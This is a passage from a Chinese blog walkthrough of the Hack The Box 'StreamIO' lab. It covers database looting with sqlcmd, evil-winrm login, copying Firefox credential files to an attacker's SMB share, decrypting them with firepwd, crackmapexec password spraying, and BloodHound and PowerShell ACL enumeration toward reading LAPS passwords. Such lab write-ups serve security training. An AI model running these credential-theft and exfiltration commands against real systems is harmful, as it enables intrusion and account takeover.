+<p><code>sqlcmd</code> 是微软官方提供的<strong>命令行工具</strong>，专门用于连接、管理和操作 Microsoft SQL Server（MSSQL）数据库，也支持 Azure SQL 数据库。简单来说：</p>
+<ul>
+<li><strong>它是 MSSQL 的 “命令行客户端”，替代图形化工具（如 SSMS），适合在无图形界面的服务器 &#x2F; 渗透测试场景下使用；</strong></li>
+<li><strong>支持执行 SQL 语句、批量运行 SQL 脚本、导出数据、远程连接数据库等核心操作；</strong></li>
+<li><strong>Windows 系统默认预装（尤其是安装了 MSSQL 的服务器），Linux&#x2F;macOS 也可单独安装。</strong></li>
+</ul>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220112428.png" alt="image-20260324211925589"></p>
+<p><strong>因为我们在 web 页面 SQL 注入获取了</strong><code>streamio</code> 数据库，现在更感兴趣 <code>streamio_backup</code> 数据库。看看里面有没有历史用户可以用来撞库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q &quot;select name from sys.tables;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220112429.png" alt="image-20260324212713035"></p>
+<table>
+<thead>
+<tr>
+<th><code>-S localhost</code></th>
+<th><strong>指定数据库服务器地址：</strong><code>localhost</code>（本地服务器，说明是在数据库所在服务器直接操作，无需远程连接）；MSSQL 默认端口 1433，本地连接可省略端口；</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-U db_admin</code></td>
+<td><strong>指定数据库登录用户名：</strong><code>db_admin</code>（你之前从 PHP 源码中提取的数据库管理员账号，高权限）；</td>
+</tr>
+<tr>
+<td><code>-P B18hx31234567890</code></td>
+<td><strong>指定数据库登录密码：</strong><code>B18hx31234567890</code>（源码中硬编码的 <code>db_admin</code> 密码）；</td>
+</tr>
+<tr>
+<td><code>-d streamio_backup</code></td>
+<td><strong>指定默认连接的数据库名：</strong><code>streamio_backup</code>（<code>streamio</code> 数据库的备份库，渗透测试中备份库常包含完整数据）；</td>
+</tr>
+<tr>
+<td><code>-Q &quot;select name from sys.tables;&quot;</code></td>
+<td><strong>执行单条 SQL 查询并退出：-</strong><code>sys.tables</code>：MSSQL 的系统表，存储当前数据库中所有用户创建的数据表信息；-<code>select name from sys.tables</code>：查询所有数据表的名称（核心目的是摸清数据库的表结构，为后续提取敏感数据做准备）；这里发现了两个表 movies，users</td>
+</tr>
+</tbody></table>
+<p><strong>访问所有 users 表中的数据</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220112430.png" alt="image-20260324213157780"></p>
+<h3 id="整理数据"><a href="#整理数据" class="headerlink" title="整理数据"></a>整理数据</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220112431.png" alt="image-20260324213341440"></p>
+<h3 id="hashcat-密码破解"><a href="#hashcat-密码破解" class="headerlink" title="hashcat 密码破解"></a>hashcat 密码破解</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220112432.png" alt="image-20260324213740865"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220112433.png" alt="image-20260324213808960"></p>
+<h2 id="纵向提权成功，获得-userflag"><a href="#纵向提权成功，获得-userflag" class="headerlink" title="纵向提权成功，获得 userflag"></a>纵向提权成功，获得 <code>userflag</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u nikk37 -p &#x27;passwd&#x27; -i streamio.htb</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><code>evil-winrm</code></th>
+<th><strong>一款专为渗透测试设计的 WinRM 客户端工具（基于 Ruby 开发），相比微软原生 WinRM 工具，支持凭证传递、文件上传下载、加载 PowerShell 脚本等渗透专属功能，是 WinRM 渗透的首选工具；</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-i streamio.htb</code></td>
+<td><strong>指定目标主机的 IP &#x2F; 域名：</strong><code>streamio.htb</code>（WinRM 服务默认监听 5985&#x2F;5986 端口，工具会自动探测端口）；</td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220112434.png" alt="image-20260324214036716"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220112435.png" alt="image-20260324214320603"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260325170929380.png"></p>
+<h1 id="靶机精讲：HTB-StreamIO-域控决战-Firefox-凭据爆破、Bloodhound-路径枚举和手工域攻击路径枚举，火力全开"><a href="#靶机精讲：HTB-StreamIO-域控决战-Firefox-凭据爆破、Bloodhound-路径枚举和手工域攻击路径枚举，火力全开" class="headerlink" title="靶机精讲：HTB StreamIO 域控决战 - Firefox 凭据爆破、Bloodhound 路径枚举和手工域攻击路径枚举，火力全开"></a>靶机精讲：HTB StreamIO 域控决战 - Firefox 凭据爆破、Bloodhound 路径枚举和手工域攻击路径枚举，火力全开</h1><p><strong>含有 firefox 凭据破解、Bloodhound 路径枚举和手工枚举的全景展示几大部分，帮助你深刻理解域渗透路径。更有精彩的全程渗透总结、工具总结和思路总结。</strong></p>
+<h2 id="系统枚举"><a href="#系统枚举" class="headerlink" title="系统枚举"></a>系统枚举</h2><p>**所属用户组 **<code>net user 用户名</code> 没什么特别</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202257486.png" alt="image-20260325171301537"></p>
+<p><strong>接下来可以枚举安装的程序，如</strong><code>linpeas</code> 之类的自动化枚举</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327115.png" alt="image-20251125195605364"></p>
+<p><strong>手动先看一下</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327116.png" alt="image-20260325171949781"></p>
+<blockquote>
+<p><code>Windows LAPS（Local Administrator Password Solution）</code> 是微软官方推出的本地管理员密码解决方案，用于自动化管理域中设备的本地管理员账户密码，为每台设备生成独一无二、定期自动更换的复杂密码，并将其安全地存储在 Active Directory 或 Microsoft Entra ID 中。不是默认安装的。重要的是与安全有关，可以注意一下**	**</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327117.png" alt="image-20260325172334892"></p>
+<blockquote>
+<p><strong>安装了浏览器，说明这个用户是比较活跃的，其中可能存在用户的缓存&#x2F;历史凭据信息</strong></p>
+</blockquote>
+<h2 id="Firefox-凭据破解"><a href="#Firefox-凭据破解" class="headerlink" title="Firefox 凭据破解"></a>Firefox 凭据破解</h2><h3 id="发现凭据-配置文件"><a href="#发现凭据-配置文件" class="headerlink" title="发现凭据&#x2F;配置文件"></a>发现凭据&#x2F;配置文件</h3><p><code>the profiles file location of firefox in windows system</code> 即：在 Windows 系统中，Firefox 的用户配置文件（包含书签、密码、扩展等所有个人数据）默认存储</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327118.png" alt="image-20260325172800623"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202257506.png" alt="image-20260325172633659"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202259999.png" alt="image-20260325172650956"></p>
+<p><strong>可以看到相应的存储路径和存储文件</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327119.png" alt="image-20260325173145291"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327120.png" alt="image-20260325173311196"></p>
+<h3 id="破解方式"><a href="#破解方式" class="headerlink" title="破解方式"></a>破解方式</h3><p>**在搜索到的路径 **<code>C:\Users\&lt;username&gt;\AppData\Roaming\Mozilla\Firefox\Profiles</code> 发现 敏感文件 <code>key4.db</code> 和 <code>logins.json</code></p>
+<p><strong>此外，我们还需要搜</strong><code>Firefox password crack</code> 破解方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202300093.png" alt="image-20260325175622846"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327121.png" alt="image-20260325173659278">   **	**这里说需要 NSS</p>
+<p><strong>搜索到的这个</strong><code>firepwd.py</code> 工具好像正好符合现在的情况，试一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202300525.png" alt="image-20260325173904845"></p>
+<hr>
+<h3 id="传回敏感文件"><a href="#传回敏感文件" class="headerlink" title="传回敏感文件"></a>传回敏感文件</h3><p>**我们想把靶机上的内容传回 kali，所以使用 impacket 工具包中的 **<code>smbserver.py</code> 脚本建立一个 SMB 服务，把当前目录，以 <code>share</code> 为名，共享出来，指定用户名密码，同时让他支持 <code>smb2</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/doc/python3-impacket/examples/smbserver.py share . -user RedteamNotes -pass RedteamNotes -smb2support</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327122.png" alt="image-20260325174527540"></p>
+<p><strong>回到靶机中，连接刚才建立的 SMB 服务</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\kaliIP\share /u:RedteamNotes RedteamNotes</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327123.png" alt="image-20260325175034619"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy xxx \\kaliIP\share</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327124.png" alt="image-20260325175251594"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202302551.png" alt="image-20260325175520483"></p>
+<p><strong>成功传回</strong></p>
+<h3 id="firepwd-破解"><a href="#firepwd-破解" class="headerlink" title="firepwd 破解"></a>firepwd 破解</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202302644.png" alt="image-20260325175748566"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202303857.png" alt="image-20260325175833145"></p>
+<blockquote>
+<p>**Kali Linux 中直接执行了 **<code>firepwd.py</code> 脚本，但系统把它当作 Shell 脚本来解析了，而不是用 Python 解释器运行</p>
+<p><strong>使用 Python 显式运行（推荐）（需要安装相应的库）（最好把需要的</strong><code>key4.db</code> 和 <code>logins.json</code> 放一块）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./firepwd/firepwd.py</span><br></pre></td></tr></table></figure></blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327125.png" alt="image-20260325180006557"></p>
+<p><strong>成功破解出密码对</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327126.png" alt="image-20260325180513025"></p>
+<h3 id="整理凭据"><a href="#整理凭据" class="headerlink" title="整理凭据"></a>整理凭据</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327127.png" alt="image-20260325180737096"></p>
+<h2 id="使用-crackmapexec-密码验证，获得-JDgodd-凭据"><a href="#使用-crackmapexec-密码验证，获得-JDgodd-凭据" class="headerlink" title="使用 crackmapexec 密码验证，获得 JDgodd 凭据"></a>使用 <code>crackmapexec</code> 密码验证，获得 <code>JDgodd</code> 凭据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb streamio.htb -u firefox_creds_user -p firefox_creds_pwd --continue-on-success</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202304816.png" alt="image-20260325181058547"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec winrm streamio.htb -u firefox_creds_user -p firefox_creds_pwd --continue-on-success</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202305730.png" alt="image-20260325181250826"></p>
+<blockquote>
+<p><strong>当 <strong><code>crackmapexec smb</code> 能够验证凭据有效，但 <code>crackmapexec winrm</code> 却无法得到结果时，说明目标主机</strong>可能没有启用 WinRM</strong>，或者 WinRM 的配置&#x2F;防火墙限制了访问。这是很常见的情况。</p>
+<p><strong>既然 SMB 认证成功，你就****不需要 WinRM</strong>！直接通过 SMB 的各种工具执行命令和横向移动即可。</p>
+<p><strong>如</strong><code>crackmapexec</code> 执行命令，<code>impacket</code> 工具包：<code>psexec.py   smbexec.py    wmiexec...</code></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>协议</strong></th>
+<th><strong>角色定位</strong></th>
+<th><strong>适用场景</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>SMB</strong></td>
+<td><strong>基础探测 + 横向移动载体</strong></td>
+<td><strong>- 验证凭据有效性 - 执行远程命令（PsExec、WMI 等底层依赖） - 文件传输和共享访问</strong></td>
+</tr>
+<tr>
+<td><strong>WinRM</strong></td>
+<td><strong>高效横向移动工具</strong></td>
+<td><strong>- PowerShell 远程执行 - 获得交互式 Shell - 规避部分 EDR 检测</strong></td>
+</tr>
+</tbody></table>
+<p><strong>凭据有效，但共享没连接上</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202306559.png" alt="image-20260325181825028"></p>
+<blockquote>
+<p><code>smbmap</code> 让你快速知道：目标机器上有什么共享、你能对这些共享做什么（读&#x2F;写&#x2F;删），是 SMB 信息收集和权限确认的轻量级工具。</p>
+</blockquote>
+<h2 id="bloodhound-攻击路径分析"><a href="#bloodhound-攻击路径分析" class="headerlink" title="bloodhound 攻击路径分析"></a>bloodhound 攻击路径分析</h2><p><strong>下图是官方文档，有详细信息</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327128.png" alt="image-20260325182947807"></p>
+<blockquote>
+<p><strong>用图论揭示活动目录中隐藏且常常意外存在的关系，使用它可以轻松识别复杂的攻击路径</strong></p>
+<p><strong>工具的逻辑是用信息搜集器在目标环境（域）获取相关的信息，然后拿到主程序中进行分析，找到可以利用的攻击路径</strong></p>
+<p><strong>因为我们是有用户名密码</strong><code>nikk37</code> 和 <code>JDgodd</code> 的，可以用 py 文件远程获取；否则需要下载到 Windows 中让其在收集完信息后传回 kali</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202307604.png" alt="image-20260325182646230"></p>
+<h3 id="采集器的使用—有用户名密码–kali"><a href="#采集器的使用—有用户名密码–kali" class="headerlink" title="采集器的使用—有用户名密码–kali"></a>采集器的使用—有用户名密码–kali</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327129.png" alt="image-20260325183610141"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -c ALL -u username -p &#x27;passwd&#x27; -ns 10.129.64.95 -d streamio.htb -dc streamio.htb --zip</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>以用户</strong><code>jdgodd</code> 登录到目标机器，执行“ALL”全部的信息收集方法</p>
+<table>
+<thead>
+<tr>
+<th><strong>参数</strong></th>
+<th><strong>值</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-c</code></td>
+<td><code>ALL</code></td>
+<td><strong>收集所有类型的数据（用户、组、计算机、ACL、会话等）</strong></td>
+</tr>
+<tr>
+<td><code>-u</code></td>
+<td><code>username</code></td>
+<td><strong>指定认证的用户名（需要替换为实际用户名）</strong></td>
+</tr>
+<tr>
+<td><code>-p</code></td>
+<td><code>&#39;passwd&#39;</code></td>
+<td><strong>指定密码（用单引号包裹，防止特殊字符被解析）</strong></td>
+</tr>
+<tr>
+<td><code>-ns</code></td>
+<td><code>10.129.64.95</code></td>
+<td><strong>指定 DNS 服务器（通常是域控的 IP）</strong></td>
+</tr>
+<tr>
+<td><code>-d</code></td>
+<td><code>streamio.htb</code></td>
+<td><strong>指定目标域名</strong></td>
+</tr>
+<tr>
+<td><code>-dc</code></td>
+<td><code>streamio.htb</code></td>
+<td><strong>指定域控制器（可以是主机名或 FQDN）</strong></td>
+</tr>
+<tr>
+<td><code>--zip</code></td>
+<td><strong>-</strong></td>
+<td><strong>将输出的 JSON 文件压缩成一个 zip 包</strong></td>
+</tr>
+</tbody></table>
+<p><code>FQDN = Fully Qualified Domain Name</code>（完全限定域名）包括下面全部部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hostname.domain.tld</span><br><span class="line"> ↓        ↓    ↓</span><br><span class="line">主机名   域名  顶级域</span><br></pre></td></tr></table></figure></blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202308315.png" alt="image-20260325184108632"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202308484.png" alt="image-20260325184547804"></p>
+<p><strong>包括域中各个单元和对象的数据</strong></p>
+<h3 id="初始化主程序数据库"><a href="#初始化主程序数据库" class="headerlink" title="初始化主程序数据库"></a>初始化主程序数据库</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327130.png" alt="image-20260325193252974"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327131.png" alt="image-20260325193409183"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202309788.png" alt="image-20260325193435457"></p>
+<p><strong>成功启动 7687 端口</strong></p>
+<p>**命令行输入 **<code>bloodhound</code> 即可启动下面的页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327132.png" alt="image-20260325193557099"></p>
+<p><strong>主界面</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327133.png" alt="image-20260325193727753">    <img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327134.png" alt="image-20260325193802066"></p>
+<p><strong>最右方有</strong><code>upload data</code> 的功能，上传我们采集到的信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202311440.png" alt="image-20260325193907768"></p>
+<p><strong>导入过程</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327135.png" alt="image-20260325193939850"></p>
+<p>**刷新一下数据库，可以看到更新的内容，上方输入框可以搜已经获得资产，如 **<code>JDgodd</code> 用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327136.png" alt="image-20260325194301948"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202312442.png" alt="image-20260325194548757"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202312491.png" alt="image-20260325194637923"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202327137.png" alt="image-20260325194817910"></p>
+<blockquote>
+<p><strong>这里就算从</strong><code>JDGODD</code> 出发，通过将 <code>JDGODD</code> 设置成 <code>CORE STAFF</code> 的组成员（<code>Owns</code>），而且 <code>JDGODD</code> 本身具有写 <code>Owner</code> 的权限（<code>Write Owner</code>）。设置成组成员之后，可以读取 <code>LAPS Password</code>（<code>ReadLAPSPassword</code>），从而获取域控权限</p>
+<p><strong>中间的具体操作方法可以右键查看详细帮助，如下图，都是通用的，熟悉之后就好了</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202313359.png" alt="image-20260325194858525"></p>
+<h2 id="手工分析活动目录攻击路径（同-bloodhound-做法与目的一致）"><a href="#手工分析活动目录攻击路径（同-bloodhound-做法与目的一致）" class="headerlink" title="手工分析活动目录攻击路径（同 bloodhound 做法与目的一致）"></a>手工分析活动目录攻击路径（同 bloodhound 做法与目的一致）</h2><p><strong>看一下</strong><code>jdgodd</code> 的属性</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202530692.png" alt="image-20260325200405126"></p>
+<p><strong>或者下面的（意义区别不大）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsget user &quot;CN=jdgodd,CN=users,DC=streamio,DC=htb&quot; -memberof -expand</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202515304.png" alt="image-20260325195910214"></p>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>参数</strong></th>
+<th><strong>值</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>dsget</code></td>
+<td><strong>-</strong></td>
+<td><strong>Windows Server 自带的 AD 查询工具</strong></td>
+</tr>
+<tr>
+<td><code>user</code></td>
+<td><strong>-</strong></td>
+<td><strong>指定要查询的对象类型为用户</strong></td>
+</tr>
+<tr>
+<td><code>&quot;CN=jdgodd,CN=users,DC=streamio,DC=htb&quot;</code></td>
+<td><strong>DN (Distinguished Name)</strong></td>
+<td><strong>用户</strong><code>jdgodd</code> 在 AD 中的完整路径</td>
+</tr>
+<tr>
+<td><code>-memberof</code></td>
+<td><strong>-</strong></td>
+<td><strong>显示该用户所属的组</strong></td>
+</tr>
+<tr>
+<td><code>-expand</code></td>
+<td><strong>-</strong></td>
+<td><strong>展开嵌套组，显示用户间接所属的所有组</strong></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="📁-DN（Distinguished-Name）解析"><a href="#📁-DN（Distinguished-Name）解析" class="headerlink" title="📁 DN（Distinguished Name）解析"></a>📁 DN（Distinguished Name）解析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CN=jdgodd,CN=users,DC=streamio,DC=htb</span><br><span class="line">│        │        │            │</span><br><span class="line">│        │        │            └── 顶级域组件（htb）</span><br><span class="line">│        │        └── 域组件（streamio）</span><br><span class="line">│        └── 容器（users 组织单元）</span><br><span class="line">└── 对象名称（用户名 jdgodd）</span><br></pre></td></tr></table></figure>
+
+
+<table>
+<thead>
+<tr>
+<th><strong>组件</strong></th>
+<th><strong>全称</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>CN</code></td>
+<td><strong>Common Name</strong></td>
+<td><strong>对象名称（用户&#x2F;组&#x2F;计算机）</strong></td>
+</tr>
+<tr>
+<td><code>OU</code></td>
+<td><strong>Organizational Unit</strong></td>
+<td><strong>组织单元（如果路径中有 OU）</strong></td>
+</tr>
+<tr>
+<td><code>DC</code></td>
+<td><strong>Domain Component</strong></td>
+<td><strong>域组件（域名拆分）</strong></td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><code>net groups</code> 整个域控中有哪些组，第二个就是我们需要的（非默认且特别）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202548115.png" alt="image-20260325200542123"></p>
+<p><code>get-adgroup &quot;core staff&quot;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202515311.png" alt="image-20260325200727231"></p>
+<p><strong>看</strong><code>core staff</code> 这个组有哪些 <code>access</code> 权限，控制列表有哪些项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(get-acl &quot;AD:CN=CORE STAFF,CN=Users,DC=streamio,DC=htb&quot;).access</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>部分</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>get-acl</code></td>
+<td><strong>PowerShell 的 ACL 获取命令（类似 Linux 的</strong><code>getfacl</code>）</td>
+</tr>
+<tr>
+<td><code>&quot;AD:...&quot;</code></td>
+<td><strong>AD 提供程序路径，用于访问 Active Directory 对象</strong></td>
+</tr>
+<tr>
+<td><code>CN=CORE STAFF,CN=Users,DC=streamio,DC=htb</code></td>
+<td><strong>组的 DN（可分辨名称）</strong></td>
+</tr>
+<tr>
+<td><code>.access</code></td>
+<td><strong>提取 ACL 中的访问控制条目（ACE）列表</strong></td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202548116.png" alt="image-20260325200944744"></p>
+<p><strong>太长，看不过来？</strong>	<strong>可以加一些过滤</strong></p>
+<blockquote>
+<p><strong>[!NOTE]</strong></p>
+<p><strong>我们肯定想找这个特殊组里存不存在我们已有的用户（nikk37，jdgodd），有权限干的事情</strong></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(get-acl &quot;AD:CN=CORE STAFF,CN=Users,DC=streamio,DC=htb&quot;).access | where-object &#123; $_.IdentityReference -like &quot;*jdgodd*&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><code>$_</code></th>
+<th><strong>当前管道对象（表示正在处理的每一个 ACE 条目）</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>.IdentityReference</code></td>
+<td><strong>访问 ACE 中的身份引用属性（谁拥有权限）</strong></td>
+</tr>
+<tr>
+<td><code>-like</code></td>
+<td><strong>模糊匹配运算符</strong></td>
+</tr>
+<tr>
+<td><code>&quot;*jdgodd*&quot;</code></td>
+<td><strong>通配符模式，匹配包含</strong><code>jdgodd</code> 的任何字符串</td>
+</tr>
+<tr>
+<td><code>where-object</code></td>
+<td><strong>过滤命令的别名也可以是</strong><code>where</code> 或 <code>?</code></td>
+</tr>
+</tbody></table>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202548117.png" alt="image-20260325201352273"></p>
+<p>**发现现有用户在这个组的权限 **</p>
+<p><strong>再看这个组对这整个域有哪些权限（不是必然成功，但思路是必然的）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-adcomputer -filter *        #列出 Active Directory 域中的所有计算机对象。这里只有下面一台</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202517668.png" alt="image-20260325202207042"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-adorganizationalunit -Filter * | %&#123; (get-acl &quot;Ad:$&#123;_.distinguishedname&#125;&quot;).access &#125; | WHERE-object &#123; $_.identityreference -like &quot;*core*&quot; &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>部分</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>get-adorganizationalunit -Filter *</code></td>
+<td><strong>获取域中所有组织单元（OU）</strong></td>
+</tr>
+<tr>
+<td>&#96;</td>
+<td>%{ … }&#96;</td>
+</tr>
+<tr>
+<td><code>(get-acl &quot;AD:$&#123;_.distinguishedname&#125;&quot;).access</code></td>
+<td><strong>获取当前 OU 的 ACL，提取 .access 属性</strong></td>
+</tr>
+<tr>
+<td>&#96;</td>
+<td>WHERE-object { … }&#96;</td>
+</tr>
+<tr>
+<td><code>$_.identityreference -like &quot;*core*&quot;</code></td>
+<td><strong>筛选身份引用（谁拥有权限）包含 “core” 的条目</strong></td>
+</tr>
+</tbody></table>
+<p><strong>即：查找 Active Directory 中所有组织单元（OU）的 ACL，筛选出与 “core” 相关的权限条目</strong>。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202548118.png" alt="image-20260325202638391"></p>
+<p><strong>看到</strong><code>core staff</code> 组有<strong>读</strong>的权限，我们可以读本章刚开始<strong>枚举</strong>的，安装的 <strong>LAPS 程序</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260326202548119.png" alt="image-20260325171949781"></p>
+<p><strong>提权路径找到，域</strong><code>bloodhound</code> 一致</p>
